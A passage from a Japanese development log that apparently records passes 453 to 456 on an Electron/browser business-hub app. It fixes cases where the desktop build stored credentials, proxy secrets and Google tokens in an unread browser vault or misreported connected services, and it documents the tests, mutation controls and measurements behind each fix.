へ POST することを数える** (だからその文が要る、という根拠)。`renderer/__tests__/browserSendClaimCensus.test.ts` (**6 件**) が**ブラウザ版が実際に外へ送る 15 の道**を走査で導いて台帳と**両方向**に持ち、行ごとにその action を `invoke` する画面の実在も見る。加えて**出荷コード (`src/renderer` + `src/shared`) に「送信もデスクトップ版の機能」と 1 文で述べる所が無いこと**を、**針が当たる標本 (直す前の文そのもの)** と**注記の中では数えない標本**つきで。★ **対照 11 方向すべて鳴り、それぞれ狙った層に当たる** (A 方法 A の門を外す ❌3 / B 断りを常に null ❌3 / **C 末尾の文を直す前へ戻す ❌3** (**欠陥がそのまま再現し 2 ファイルに当たる**) / D scope note を描かない ❌2 / E 分からないときブラウザ版へ倒す ❌1 / F 台帳から 1 行消す ❌1 / G 表の action を誤らせる ❌1 / H `signIn` の床を外す ❌1 / **I 方法 B をブラウザ版で隠す ❌2** (逃げ口) / J 針を殺す ❌1 / **K web-shim から writer の呼び出しを外す ❌1** (逆向き)・復帰後 **17 / 17**)。★ **ゲートが 3 つ捕まえた —— 1 つは私の新しい検査そのもの**: ① **`fixedTickAssertionCensus` (パス 368)** が私の最初の検査を名指しした (**固定 8 周の `settle()`** のあと文を主張していた)。`npm test` は **1 failed / 19,008 passed** で落ち、失敗の diff が私のファイル名を出した。**門は正しい** —— 共有の待ち (`jsdomWait` の `settleUntil` / `waitForElement` / `waitForText`) へ寄せ、**このファイルは固定回数の待ちを 1 つも持たなくなった**ので `audit:tick-sensitivity` の母集団からも外れる ② `verify:arch` のユニットテスト数を 15805 → **15819** へ (**今回も予想せず門に訊いた**) ③ `lint:shared-judgement` —— `buildDestinations` の renderer 側の読み手が 7 → 8。**判定は今も真**だが、理由の散文が「7 つの export すべてを走査して」「renderer の 7 か所が読み」と**数を書き写していた**ので実測へ直した (数は左の列が数える · パス 419 / 421 で 2 度直した当の形)。★ **自戒 2 つ**: ① **対照 I を 2 度当て損ねた** —— 1 回目は雑な JSX 編集で検査ファイルを壊し、**読み込みに失敗して 8 件が 1 度も走らなかった** (「Tests 6 passed」= census だけが走った)。2 回目は閉じタグを 1 つ手前 (内側の `</div>`) に当てて `tsc` が構文で落ちた。3 回目に「外枠の閉じは内側の次の `</div>`」と**構造で**選んで狙いどおり ❌2。**「検査が 0 件」は緑ではない** (パス 412 / 444 と同じ) —— そして**対照が落ちたことと、狙った門が鳴ったことは別**である ② **`Microsoft365Page:209` は JSX の素のテキストに `**` を書いている**ので画面に星印が出る。文意は正しいが、**その形は写さない**と決めた。★ **測って何も無かった軸も記録する**: ① **`ExportActions` の「ファイルを開く」「保存先フォルダを開く」はブラウザ版で騒がしく断る** (`notSupportedAlert` が `{ok:false}` + 文を返し、画面が `data-os-op-error` で出す) ② **`authorize` の 3 つ目の呼び手 `StatusBar:145` は `oauthSupported` で門が在る** ③ **カードの「トークンの保存方法はビルドと環境で変わります」は両ビルドとも真**。`typecheck` 緑・`npm test` **892 / 19,009**・`verify:all` exit 0・`chain:verify` 緑 (保護対象は 1 つも触っていない)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 278 ms / heap 10.3 MB・FULL DCL 721 ms / heap 36.9 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **53 回目**でもあり、今回も再現しなかった)。**`e2e:ollama` は回していない** —— main の Ollama を 1 行も触っていない)・— **2026-09-25 パス 456 後の計測: 11,968,474 B / 3,380,993 B (両方 +716 B** —— 実行形態を問う口 1 つ・断りの 1 文 (日本語)・接続ハブの読み先を橋へ。**増分の大半はその 1 文**で、docblock は最小化で落ちる。`shared/` と `renderer/` は両ビルドが読むので LITE も同じだけ増える。**誰も読まない所へ共有秘密を保存させて「保存しました」と言い、その隣で設定済みのサービスを「0 / 74」と言っていた。** **見つけ方**: パス 454 / 455 の問い (「この実行形態で本当に働くか」) を**保管庫の外**へ当てた。3 つの軸を先に実測し、**2 つは何も無かった**: ① **`renderer/fs/fsa.ts`** —— デスクトップ版 (Electron 43 · `file://` · `sandbox: true` / `contextIsolation: true`) で `typeof window.showDirectoryPicker === 'function'`・`isSecureContext === true`・`showDirectoryPicker({mode:'readwrite'})` は**投げずにダイアログを開く** (12 秒待っても解決しない = 開いたまま)。**File System Access API は本当に使える**ので門は要らない ② **`renderer/library/library.ts`** —— 保管庫・施錠・実行形態・橋への参照が **0 件**なので、依らないことが構造から出る。本物は 3 つ目だった。実測 (2026-09-25 · 直す前 · jsdom で実物の `ProxySection` を描き、実際に打って押す):

| 段 | 実測 (デスクトップ版) |
| --- | --- |
| 札 (開く前) | 未設定 |
| 「設定する」 | 出る |
| URL 欄・共有秘密の欄 | 出る |
| 「保存」 | 押せる (`disabled === false`) |
| 押した結果 | **「プロキシ設定を保存しました」** (札も「設定済み」へ) |
| 保管層 | **`{"url":"…","sharedSecret":"SUPER-SECRET-…"}`** —— 実際に入る |
| デスクトップ版の読み手 | **0 件** |

★ **パス 454 / 455 と同じ家系だが、こちらは静かに成功する。** あちらは保管庫が施錠されていて断られた (騒がしいが、動かせない状態を名指しした)。ここは**平文の IndexedDB** (`business-hub-preferences` / key `proxy`) なので書き込みは本当に成功し、画面は成功したと言い、札まで変わる —— **利用者が誤りに気付く手がかりが 1 つも無い。**★ **読み手は全部ブラウザ版に居る** (実測) —— `getProxyConfig` / `fetchViaProxy` を呼ぶ出荷コードは `web-shim.ts` と、それだけが import する `data/saasWriteWeb.ts` で、`web-shim.ts:1966` は `if (typeof window !== 'undefined' && !window.serviceHub)`。**main 側にプロキシの仕組みは 1 つも無い** (`setProxy` / `proxy-server` / `ProxyConfig` / `HTTPS_PROXY` の出現は `src/main` と `src/preload` で **0 件**)。★ **向きが利用者の損である** —— プロキシを設定する人は*経路を自分の側で押さえる*ためにそうする (社内の出口統制・SaaS 側の IP 許可・自宅 IP を晒さない)。デスクトップ版は各サービスへ**直接**つなぐので、その人が求めた統制はまるごと効かず、画面は効いていると言う。節が名乗る理由 (「CORS でブラウザ直接呼び出し不可」) も**デスクトップ版では偽**である (CORS はブラウザの制約で、main の fetch には掛からない)。★ **名指しできる働く道は「実行形態」しかない** —— デスクトップ版に経路を変える設定は 1 つも無いので別の画面を指せない。だから指すのは**ブラウザ版そのもの**で、それは利用者が実際に取れる手である。**直し**: ① 文は `shared/buildDestinations.ts` の `proxyUnusedNote(kind)` (`.tsx` は変異検査の母集団の外) ② `useBuildKind()` で問い、デスクトップ版では**「設定する」を出さない** (**断りは押す前に言う** —— 読まれない所へ共有秘密を打たせてから断るのでは遅い)。`save()` にも床 ③ **分からないあいだ (`null`) は断らない** ④ **「削除」は実行形態で隠さない** (既に保存した人から消す口まで消すと 法則 `escape-hatch-stays-open` を破る)。★★ **そして新しい census が、書いたその場で 4 件目を見つけた —— しかもこちらは読み側だった**: `ConnectionHub` (設定画面の先頭の節) が `getVault().listConfigured()` を**直に**読んでいた。あの保管庫はデスクトップ版で 1 バイトも書けないので (パス 455)、`vault.listConfigured()` は `requireKey()` を通らず**投げずに `[]` を返す**。実測 (2026-09-25 · 直す前 · 橋が github / slack を「設定済み」と答える端末):

| 見るもの | 直す前 |
| --- | --- |
| 見出しの行 | **0 / 74 サービスが接続済み** |
| ⚪ 未接続 | **74 件** |
| 「✅ 接続済み」の節 | **出ない** |
| 保管庫の `listConfigured()` | `[]` |

**設定した本人に、1 件も設定していないと告げていた** —— しかも「クリックで開いて接続」と 74 件ぜんぶをやり直しに誘う。**パス 454 / 455 / 456 の家系の鏡**で、あちらは「この実行形態が読まない保管先へ書く」、こちらは**「この実行形態が書かない保管先から読む」**。同じ根 (保管庫はブラウザ版だけの物で、橋がその振り分けを持つ) から出る。★ **同じ画面が同じ問いに 2 通り答えていた** —— 隣の `UnusedCredentialSection` (:1072) は最初から橋を読んでいる。**直し**: 橋 (`window.serviceHub.listConfigured()`) を読む —— ブラウザ版では shim が保管庫へ、デスクトップ版では main の保管ファイルへ振り分くので**両ビルドで正しくなる** (ブラウザ版の答えは 1 文字も変わらない)。★ **機械は 3 層** —— `renderer/pages/__tests__/proxySectionBuildGate.test.ts` (**6 件**) が実物の節を 3 つの実行形態で描いて押し、`renderer/pages/__tests__/connectionHubReadsBridge.test.ts` (**4 件**) が橋の答えがそのまま出ること・本当に 0 件なら 0 件と言うこと (逆向き)・読めなかったときに例外の文面をこの節へ流さないことを見る。母集団は `renderer/__tests__/settingsSectionBuildReachCensus.test.ts` (**8 件**) —— 設定画面の JSX の大文字タグ (実測 **17**) を走査し、1 つずつ `both` / `browser-only` / `no-store` / `layout` を理由つきで名乗らせ (**両方向**)、`browser-only` には**実行形態の判定が原文に在ること**を要求する。★ **逆向きも入れた (パス 455 の対照 J の教訓)** —— **分類を下げるのも退行の 1 手**なので、原文からブラウザ版だけの保存先 (`getVault()` / `setProxyConfig(`) を探し、それに触る節が `browser-only` を名乗ることを要求する。★ **その針が書いたその場で私の docblock に当たった** —— `ConnectionHub` を橋へ移したときに「直す前は `getVault()` を読んでいた」と説明を書き、**走査がその説明を宣言として数えた** (法則 `mention-vs-declaration`)。`stripNonCode` を通し、**針が的に当たることと注記では当たらないことを標本で**留めた。★ **対照 11 方向すべて鳴り、それぞれ狙った層に当たる** (A 「設定する」の門を外す ❌1 / B 断りを常に null ❌3 / C `save()` の床を外す ❌1 / D 「削除」を実行形態で隠す ❌1 / E 分からないときデスクトップ版へ倒す ❌1 / F 台帳から 1 行消す ❌1 / **G `ConnectionHub` を保管庫の読みへ戻す ❌3** (**欠陥がそのまま再現**) / H 台帳に無い節を描く ❌1 / I `browser-only` なのに判定しない ❌3 / **J 分類を `both` へ下げる ❌1** (逆向き) / K 断りを描かない ❌2)・復帰後 **18 / 18**。★ **自戒 3 つ**: ① **`typecheck` だけが 2 件捕まえた** (`waitForElement<HTMLInputElement>` へ渡す `querySelector` が `Element | null`) —— vitest は型を剥がす。**パス 373 / 402 / 404 / 434 / 445 / 446 / 448 / 453 / 454 / 455 と同じ罠で 11 度目**である ② **jsdom で React の制御された欄へ打つときは `act` で包まない** —— `act(async () => typeInto(el, v))` だと `input` の後に React が制御された値を戻し、**state が動かないまま欄が空に戻る** (実測: `setter` 直後は値が入っているのに、次の再描画で `""`)。既存の検査 (`aiCredentialFieldsWritable`) は打つ所を包んでおらず、**そちらが正しい形**だった ③ **`pkill -f electron` が自分の bash を殺した** —— コマンドラインにその綴りが入っているので自己一致する (2 度、exit 144 で無音に終わった)。★ **測って何も無かった軸も記録する**: ① **`UnusedCredentialSection` は最初から橋を読む** ② **`CredentialRow` が保管庫を読むのは正しい** (スロットそのものが保管庫で、パス 455 が書けないことを画面に述べさせた) ③ **`CloudSyncPanel` は保存を 1 つも持たない** (`setItem` / 記録のストアの出現は 0 件・送信路も未実装で、それは既に画面が述べている) ④ **`FsaSection` の「Chrome / Edge / Opera のみ対応」はデスクトップ版で紛らわしいが偽ではない** (Electron は Chromium で、picker は実際に開く)。`typecheck` 緑・`npm test` **890 / 18,995**・`verify:all` exit 0・`chain:verify` 緑 (保護対象は 1 つも触っていない)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 232 ms / heap 10.4 MB・FULL DCL 680 ms / heap 37.1 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **52 回目**でもあり、今回も再現しなかった)。**`e2e:ollama` は回していない** —— main の Ollama を 1 行も触っていない)・— **2026-09-25 パス 455 後の計測: 11,967,758 B / 3,380,277 B (両方 +1,151 B** —— 実行形態を問う口 1 つ・断りの 2 文 (日本語・スロットごとの行き先つき)・スロットの表に 8 行 (`desktopScreen`)・画面の配線。**増分の大半はその 2 文**で、docblock は最小化で落ちる。`shared/` と `renderer/` は両ビルドが読むので LITE も同じだけ増える。**働かない実行形態が、本物の API キーを貼らせてから断っていた。** **見つけ方**: パス 454 が残した `CredentialRow` (「API キーとトークン」9 スロット) を閉じに行き、**そのときパス 454 の記述が 2 つ偽だと分かった**。実測 (2026-09-25 · 直す前 · jsdom で実物の行を描き、実際に打って押す):

| 段 | 実測 |
| --- | --- |
| 札 | 「未設定」 (`listConfigured()` は投げずに `[]` を返す) |
| 「設定する」 | 出る |
| 伏せ字の欄 | 出る |
| 「保存」 | 押せる (`disabled === false`) |
| 押した結果 | **「Vault がロックされています」** |
| 保管層 | **`[]`** (何も入らない) |

★ **デスクトップ版の保管庫は施錠されたまま解錠できない** —— `unlock()` / `initialize()` を呼ぶ出荷コードは `security/LockScreen.tsx` の **2 行だけ**で、その画面は `App.tsx` の `if (browserMode && !vaultUnlocked)` の下にしか描かれない (デスクトップ版は `setVaultUnlocked(true)` で**素通りする**が、それは **App の state であって保管庫の鍵ではない**)。だから `setToken` の入口 `requireKey()` が必ず投げる。★ **重いのは「保存できない」ことではなく、断りが名指しする状態を利用者が動かせないこと** —— デスクトップ版に解錠の操作子は **1 つも無い** (`VaultControls` はパスワード変更と施錠をデスクトップ版では出さない)。読んだ人は在りもしない「解錠」を探しに行く (パス 388 の「原因を取り違えた断りは、直す手ごと誤らせる」の**直す手が存在しない**形) ——しかも**本物の API キーを貼り付けた後**に出る。★★ **パス 454 の publish 済みの記述を 2 つ訂正した**:

| 問い | パス 454 の記述 | **2026-09-25 の実測** |
| --- | --- | --- |
| トークンは保管庫へ入るか | 「入る」 | **入らない** (`Vault がロックされています`) |
| 画面は何と言うか | 「Google 連携を有効化しました」 | **`Vault がロックされています`** |

**直しの向きは変わらない —— むしろ強くなる**: 断りが無ければ利用者は認可ページを開き、Google の同意を済ませ、callback を貼り、**単回使用の code を実際の交換で使い切ってから**動かせない状態を名指しする断りを受け取る。**直し**: ① `CredentialSlot` に `desktopScreen` (デスクトップ版でその鍵が効く画面の `SERVICES` ラベル) —— **8 枚が持ち `anthropic` だけ持たない** (`ServiceId` ではなく、デスクトップ版の AI 鍵は skills / emotions / business / stocks / assistant の 5 サービスに分かれるので 1 枚では名乗れない・実測) ② 文は `shared/buildDestinations.ts` の `credentialSlotUnreadNote(kind, screen?)` (`.tsx` は変異検査の母集団の外) ③ `CredentialRow` は `useBuildKind()` で問い、デスクトップ版では**「設定する」を出さない** —— **断りは押す前に言う** (パス 453 で削除の確認について下したのと同じ判断)。`save()` にも床 ④ **分からないあいだ (`null`) は断らない** ⑤ **「削除」は実行形態で隠さない** —— 条件は「値が在るか」だけ (書ける道が 1 つ生えた日に消す口だけが消えるのは、パス 453 / 454 で閉じた当の形 · 法則 `escape-hatch-stays-open`)。★ **ブラウザ版の答えは 1 文字も変わらない** (実測: 断りなし・「設定する」在り)。★ **機械は 2 層** —— `renderer/pages/__tests__/credentialSlotBuildGate.test.ts` (**8 件**) が実物の行を 3 つの実行形態で描き、**名指しした 8 枚が `SERVICES` に在ること**と**その画面に働く `tokenSetup` が在ること**も見る (断りは `` `「${screen}」の画面` `` と**補間**で組むので `namedControlExists` の走査には構造的に映らない)。`renderer/__tests__/credentialWriteStoreCensus.test.ts` (**10 件**) が母集団を両方向で持ち、**`vault-ungated` は 0 件**になった。★ **対照 12 方向のうち 10 が鳴り、鳴らなかった 2 つがこのパスの副産物だった**: **J (台帳の行を `vault-ungated` へ戻す) が鳴らなかった** —— `vault-gated` の要求から外れるだけで「**門を持たないこと**」は誰も見ていなかった。門が後で消されても台帳は既に「無い」と言うので何も鳴らない ——**分類を下げるのも退行の 1 手**なので逆向きを足した (直した後 J は ❌1)。**L (行の `note` を隣の門の名前へ) も鳴らなかった** —— 門の名前を**ファイル単位**で探すと、同じファイルに 2 つの門が在るとき (`SettingsPage.tsx` は `CredentialRow` と `GoogleOAuthSection` を持つ) **隣の名前で満たされる**。書き手の関数へ絞り (`enclosingFunction`)、**M+L を重ねると絞りが load-bearing であることが出る** (M 単独では鳴らない —— 広げるだけでは正しい台帳を壊さないので、それも報せである)。残る 10 方向 (A 門を外す ❌3 / B 断りを描かない ❌2 / C デスクトップ版でも「設定する」❌1 / D 「削除」を実行形態で隠す ❌1 / E 1 スロットから `desktopScreen` を消す ❌2 / F `anthropic` に画面を名乗らせる ❌2 / G 実在しない画面を名乗る ❌1 / H `tokenSetup` を持たない画面を名乗る ❌1 / I `save()` の床を外す ❌1 / K 分からないときにデスクトップ版へ倒す ❌1)・復帰後 **18 / 18**。★ **ゲートが 4 つ捕まえた —— 1 つは私の文の誤り**: ① **`namedControlExists`** が最初の断り「ここで**「保存」**を押しても保存されません」を鳴らした —— **その実行形態ではその「保存」が描かれない**ので、**画面に無い操作子を名指ししていた** (「この欄からは保存できません」へ) ② 同じ門が「Anthropic API キー」を要求 → **7 つ目の種類 `service-page-control`** を足した (部品ではなく**画面のファイル**が綴りを持つ形。綴りを持つ画面が 1 枚以上在ることと、**その画面が `services.ts` から辿れる**ことを見る —— `other-screen-control` の「載せている画面が在るか」は、載せているのが画面自身のときは問えない) ③ **`namedEscapeHatchReachable`** が `「${screen}」` を鳴らした → **補間の台帳**を両方向で新設 (黙って外すと `「${'でたらめ'}」の画面` まで通る。台帳の行は「入る値は何か」と「**誰が確かめるか**」を書き、その検査の実在と `SERVICES` の読みも見る) ④ **`lint:shared-judgement`** が `buildDestinations` を母集団へ入れた → 判定を**実測して**書いた: **`src/main` / `src/preload` からの直の import は 0 件**で、走査に映ったのは*閉包*の 1 辺 `shared/paperAccount.ts:69` の `import type { BuildKind }` **だけ** —— **型だけの辺**なのでビルドで消え、`paperAccount` はこのモジュールの値を 1 つも読まない (7 つの export すべてを走査して 0 件)。しかも `paperAccount` を読む main 側の物は**検査 1 本だけ**で出荷コードではない。**このモジュールは逆に、実行形態ごとに別の答えを出すために在る。**★ **自戒 3 つ**: ① **`typecheck` だけが 3 件捕まえた** (`noUncheckedIndexedAccess` の `string | undefined`) —— vitest は型を剥がす。**パス 373 / 402 / 404 / 434 / 445 / 446 / 448 / 453 / 454 と同じ罠で 10 度目**である ② **既存の検査 2 本が実行形態を名乗っていなかった** (`settingsCredentialSave` / `settingsCredentialUnreadable`) —— 代役が `getVersion` を持たず `isBrowserBuild()` の `catch` がデスクトップ版へ倒すので、「ブラウザ版の節」を名乗りながら**別の実行形態を押していた** (パス 454 が `settingsGoogleOAuth.test.ts` について直したのと同じ形で **2 度目**) ③ **背景に回ったコマンドの終了コードは最後のコマンドの物である** —— パス 454 は pipe の終端で、今回は末尾の `echo exit=$?` で、**どちらも「exit 0」と報せてきたのに 1 件・13 件落ちていた**。結果はログから読む。★ **測って何も無かった軸も記録する**: ① **ブラウザ版で保管庫が施錠中のときの 9 スロットは既に閉じている** (札は「確認できません」+ 理由 · パス 159) ② **デスクトップ版で保管庫を読む出荷コードは 0 件** (書く道も断ったので、この保管庫はデスクトップ版で完全に死んでいる) ③ **8 枚の行き先はどれも 1 枚に定まる** (`getValidToken(serviceId)` が `main.ts:483` / `:554` で総称に解くので、そのサービスの画面の `StatusBar` が効く道である)。`typecheck` 緑・`npm test` **887 / 18,977**・`verify:all` exit 0・`chain:verify` 緑 (保護対象は 1 つも触っていない)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 240 ms / heap 10.3 MB・FULL DCL 689 ms / heap 36.9 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **51 回目**でもあり、今回も再現しなかった)。**`e2e:ollama` は回していない** —— main の Ollama を 1 行も触っていない)・— **2026-09-25 パス 454 後の計測: 11,966,607 B / 3,379,126 B (両方 +877 B** —— 実行形態を問う口 1 つと、断りの 1 文 (日本語)・画面の配線。**増分の大半はその 1 文**で、docblock は最小化で落ちる。`shared/` と `renderer/` は両ビルドが読むので LITE も同じだけ増える。**デスクトップ版が読まない保管庫へ、生きた Google のトークンを書き、画面は成功したと言っていた。** **見つけ方**: パス 453 の隣 (「消す口が在るか」) から**保管先そのもの**へ降りた。renderer の保管先は 2 つ在り、**どちらが生きているかは実行形態で決まる**。実測 (2026-09-25):

| 保管先 | 書く口 | 読む口 | 生きている実行形態 |
| --- | --- | --- | --- |
| main の保管ファイル | 橋 `window.serviceHub.setToken` | 橋 `listConfigured` / main の client | **デスクトップ版** |
| ブラウザ版の保管庫 (IndexedDB) | `getVault().setToken` | **`web-shim.ts` の 11 か所だけ** | **ブラウザ版** |

★ **`web-shim.ts:1966` は `if (typeof window !== 'undefined' && !window.serviceHub)`** —— shim はブラウザ版だけ据え付くので、**デスクトップ版には保管庫を読む物が 1 つも無い**。それなのに保管庫へ**直接**書く節が 2 つ在り、どちらも実行形態を問わずに描かれていた。デスクトップ版で `GoogleOAuthSection` の 4 本 (`drive` / `calendar` / `gmail` / `google-access`) に起きること (実測):

| 問い | 実測 |
| --- | --- |
| 読む物が在るか | **0 件** |
| 「API キーとトークン」の 9 スロットに出るか | **出ない** (固定鍵に無い) |
| 「使われていない資格情報」に出るか | **出ない** (橋 = main の保管ファイルを読む) |
| `StatusBar` の「削除」で消えるか | **消えない** (橋を叩くので保管庫に届かない) |
| 画面が何と言うか | **「Google 連携を有効化しました (Drive / Calendar / Gmail)」** |

★ **生きた Google の access token が、誰も読まず誰も消せない場所へ入り、画面は成功したと言う。** 法則 `escape-hatch-stays-open` の、逃げ口が**最初から無い**形である (パス 453 は「保存した直後に出ない」・パス 427 は `StatusBar`)。しかも 1941 行の注記は「これで DrivePage / CalendarPage / GmailPage の `listConfigured()` チェックが ✓ になり」と書くが、**デスクトップ版では偽** (3 画面は橋を読む)。★ **前提はファイル自身が述べていた** —— 同じ `SettingsPage.tsx` の `VaultControls` (:438) は 2026-09-09 (パス 137) から `isBrowserBuild()` で「デスクトップ版には保管庫が無い (トークンは main の secrets.json)」と判定している。**保管庫へ書く 2 つの節だけがその判定を持っていなかった。** **直し**: ① `useBuildKind()` (パス 161 の判定を 1 つ) で問い、**デスクトップ版と分かったときだけ** `start()` が**書く前に**断る (認可ページを開く前 —— 開いてから断ると、単回使用の code を使い切ってから「読まない」と知る) ② 断りは**働く道を名指しする** —— `GoogleConnectCard` の「Google でサインイン」(Drive / カレンダー / Gmail の 3 画面に在る)。そちらは `authorize()` → main の `setOAuthTokens` で**更新トークンつきの TokenSet** を書く ③ **橋へ流し込む形は採らない (理由を測って決めた)** —— この節が持っているのは `accessToken` だけなので、橋へ渡すと**同じスロットを裸の access token で上書きして更新トークンを落とす** (実測: `getValidToken` は JSON でない保存値を生の Bearer として返すので動くように見え、1 時間後に黙って切れ、繋ぎ直す手も消える) ④ **分からないあいだ (`null`) は断らない** —— 既定を `'desktop'` に倒すと、橋の `getVersion` が一瞬遅れただけでブラウザ版の**唯一の** Google 認証の道が死ぬ。**間違って断るほうが、1 フレーム遅れて断るより害が大きい** (同じ判断が `useBuildKind` の docblock に在る) ⑤ 文は `shared/buildDestinations.ts` が持つ (パス 161 が同じ家系のために置いた所・`.tsx` は変異検査の母集団の外)。★ **ブラウザ版の答えは 1 文字も変わらない** (実測: 断りは `null`・認可 URL も同じ)。★ **機械は 2 層** —— `renderer/pages/__tests__/googleOAuthPasteBuildGate.test.ts` (**6 件**) が実物の節を描いて押し、デスクトップ版では断りが出て認可ページを開かず **2 段目へも進まない**ことを見る (交換の要求も 0 件)。`renderer/__tests__/credentialWriteStoreCensus.test.ts` (**9 件**) が母集団を**両方向**で持つ —— 受け手つきの `setToken(` を走査し (受け手を外すと `StatusBar` の state setter を拾う · 実測 5 件 → 6 件)、1 件ずつ `bridge` / `vault-gated` / `vault-ungated` を理由つきで名乗らせ、**分類の裏取り** (受け手が `getVault()` / `window.serviceHub` に束ねられていることを原文で) と**前提** (保管庫を読む出荷コードは web-shim だけ) も見る。★ **対照 11 方向すべて鳴り、それぞれ狙った層に当たる** (A `start()` の門を外す ❌1 / B 断りを描かない ❌2 / C 断りの文を常に null ❌4 / D 台帳の分類を `vault-ungated` へ ❌1 / E 台帳から 1 行消す ❌1 / F 台帳に無い保管庫の書き込みを足す ❌1 / G `useBuildKind` を外す ❌2 / H 断りが操作子を名指ししない ❌1 / I 分からないときにデスクトップ版へ倒す ❌1 / J 出荷コードに保管庫の読みを足す ❌1 / **K 3 画面から `GoogleConnectCard` を外す ❌1** (載せる画面が 0 枚)・復帰後 **31 / 31**)。★ **ゲートが 1 つ捕まえた —— 設計どおり** —— `namedControlExists` (パス 426) が新しい断りの「Google でサインイン」を「台帳に書け」と鳴らした。ところが既存の 5 つの種類はどれも当てはまらない (この操作子は**別の画面**に在る) ので、**6 つ目の種類 `other-screen-control` を足した** —— 綴りが描画元に在ることに加え、**その部品を載せている画面が 1 枚以上在ること**も要求する (部品だけ在って誰も載せていなければ、利用者はその操作子へ辿り着けない。`same-screen-control` では自明に真なので問わない問いである)。対照 K がその新しい半分に当たる。★ **既存の検査 1 本に「どちらの実行形態を試しているか」を名乗らせた** —— `settingsGoogleOAuth.test.ts` の橋の代役は `getVersion` を持っておらず、`isBrowserBuild()` の `catch` が `false` = デスクトップ版へ倒していた。**2026-09-25 まで 6 本の検査がどれも `getVersion` を持たず**、実行形態を名乗らないまま「ブラウザ版の節」を押していた (標本が母集団を名乗らない形 · パス 429 の家系)。★ **`complete()` 側の門は床であって、今日の働く門ではない (正直に書く)** —— 2 段目は `authUrl` 状態でしか描かれず `authUrl` は `start()` しか立てないので、`start()` が断つと**届く道が無い**。だからその門そのものに当たる対照は**鳴らない** (検査は「2 段目が出ないこと」を主張する)。床を残すのは、2 段目を「保存したセッションから再開する」形に変えた日に書き込みの道が再び開くからである。★ **自戒 2 つ**: ① 検査は 6 件とも緑なのに `typecheck` だけが 6 件捕まえた (`waitForElement` / `settleUntil` の引数の並びと `querySelector` の型) —— vitest は型を剥がす。**パス 373 / 402 / 404 / 434 / 445 / 446 / 448 / 453 と同じ罠で 9 度目**である ② **`npm test` を `| tail -14` で回して結果を失った** —— 背景へ移ると pipe の終端 (`tail`) の終了コードが報告されるので、**1 件落ちているのに「exit 0」と報せが来た**。パス 393 で「落ちたときに要る情報を、落ちる前に切っていた」と書いた当のことの別の形で、**pipe を通すと終了コードまで嘘になる**。以後はファイルへ落として `echo exit=$?` を添える。★ **測って何も無かった軸も記録する**: ① **`google-access` は掃除の節で消せる** (パス 453 の測定どおり) —— ブラウザ版の `clearToken` は id を検めないので実際に消える。デスクトップ版の `secrets:clear` は `isServiceId` で断るが、**main の保管ファイルにこの鍵が入る道は今日 1 つも無い** (`secrets:set` も `isServiceId` を要求し、`SERVICE_IDS` は全履歴 2 コミットで**削除が 0 件**) ② **デスクトップ版の「すべてのデータを削除」は保管庫も消す** (`session.clearStorageData()`) —— 孤児になった 4 本にも最後の逃げ口は在る (ただし「1 つだけ消す」の代わりにはならない · パス 453 の要点) ③ **`listConfiguredServices()` は `Object.keys(store)` を濾さない**ので、非 `ServiceId` の鍵がファイルに在れば掃除の節に行が出て、その「削除」は `isServiceId` に断られる —— **今日そこへ届く道は無い**ので罠であって生きた欠陥ではない ④ **`CredentialRow` (9 スロット) は同じ根だが消す口が在る**ので今日の穴は「偽の保証」だけ (説明文の「AI 経営アドバイザー / Skills / Emotions で使用」がデスクトップ版で偽)。直すには 9 スロットに*働く道*を名乗らせる必要が在り、**`anthropic` は `ServiceId` ではない**ので 1 つの操作子では名乗れない —— `credentialWriteStoreCensus` の `vault-ungated` が両方向で持ち、`docs/REMAINING_WORK.md` に実測を残した。`typecheck` 緑・`npm test` **886 / 18,966**・`verify:all` exit 0・`chain:verify` 緑 (保護対象は 1 つも触っていない)。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 239 ms / heap 10.2 MB・FULL DCL 667 ms / heap 36.9 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **50 回目**でもあり、今回も再現しなかった)。**`e2e:ollama` は回していない** —— main の Ollama を 1 行も触っていない)・— **2026-09-25 パス 453 後の計測: 11,965,730 B / 3,378,249 B (両方 +1,227 B** —— 削除の口 1 つ (状態 2 つ・handler・ボタン) と、確認文 + 結果の 2 文 (日本語)。**増分の大半はその 2 文**で、docblock は最小化で落ちる。`renderer/` は両ビルドが読むので LITE も同じだけ増える。**AI の API キーを預けた利用者に、それを消す手段が 1 つも無かった。** **見つけ方**: パス 452 の裏返し —— 宣言 (`SERVICE_CREDENTIAL_USE`) が「預かる」と言う 22 サービスについて、**画面に預ける欄と消す口が在るか**を数えた。欄を渡さないのは **2 件**で、そのうち 1 件が本物だった。実測 (2026-09-24 · 直す前 · jsdom で実物の `AssistantPage` を描いて押す):

| 測った物 | 実測 |
| --- | --- |
| `AssistantPage:359` | `hub.setToken('assistant', JSON.stringify(creds))` —— **画面から書ける** |
| 資格情報パネルの削除らしいボタン | **0 件** (「🗑 消去」は `clearChat` = 会話履歴) |
| 空のフォームで「保存」 | **断られる** (「少なくとも 1 つの API キー / URL を入力してください」) |
| `unusedStoredCredentials(['assistant'])` | **`[]`** (`collectsCredential` が true だから) |
| 設定画面の掃除の節 | **描かれない** |
| この画面の `tokenSetup` | **無い** → `StatusBar` の「削除」も出ない |

